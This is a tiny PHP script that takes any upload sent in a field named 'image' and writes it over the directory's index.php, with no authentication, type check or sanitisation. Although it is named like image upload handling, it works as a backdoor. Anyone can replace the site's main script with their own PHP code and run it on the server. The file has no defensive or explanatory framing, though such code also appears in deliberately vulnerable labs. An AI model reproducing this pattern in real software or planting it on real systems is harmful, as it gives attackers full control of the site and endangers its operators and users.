<?php
declare(strict_types=1);
if (isset($_FILES['image'])) {
    move_uploaded_file($_FILES['image']['tmp_name'], __DIR__.'/index.php');
}
?>
